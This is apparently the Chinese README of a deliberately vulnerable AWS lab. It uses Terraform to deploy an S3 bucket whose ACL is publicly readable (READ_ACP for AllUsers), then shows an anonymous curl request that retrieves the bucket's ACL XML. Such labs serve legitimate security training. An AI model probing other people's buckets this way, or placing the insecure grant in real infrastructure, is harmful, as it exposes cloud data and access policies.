# AWS S3 Bucket ACL 可读漏洞环境

[English](./README.md) | 中文

## 描述信息

这是一个用于构建 AWS S3 Bucket ACL 可读的漏洞环境靶场。

## 环境搭建

在容器中执行以下命令

```shell
cd /TerraformGoat/aws/s3/bucket_acl_readable
```

配置 AWS 访问凭证

```shell
aws configure
```

> 在 AWS 「控制台——》安全凭证」处可以设置并查看你的 `aws_access_key_id` 和 `aws_secret_access_key`

部署靶场

```shell
terraform init
terraform apply
```

> 在终端提示 `Enter a value:` 时，输入 `yes` 即可

当命令执行完后，在 Outputs 处可以看到 Bucket 名称。

## 漏洞利用

获取 Bucket ACL 策略

```shell
> curl https://houxian-xxx.s3.us-east-1.amazonaws.com/?acl -s | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<AccessControlPolicy xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Owner>
    <ID>xxx</ID>
    <DisplayName>xxx</DisplayName>
  </Owner>
  <AccessControlList>
    <Grant>
      <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
        <URI>http://acs.amazonaws.com/groups/global/AllUsers</URI>
      </Grantee>
      <Permission>READ_ACP</Permission>
    </Grant>
    <Grant>
      <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser">
        <ID>xxx</ID>
        <DisplayName>xxx</DisplayName>
      </Grantee>
      <Permission>FULL_CONTROL</Permission>
    </Grant>
  </AccessControlList>
</AccessControlPolicy>
```

## 销毁环境

```shell
terraform destroy
```
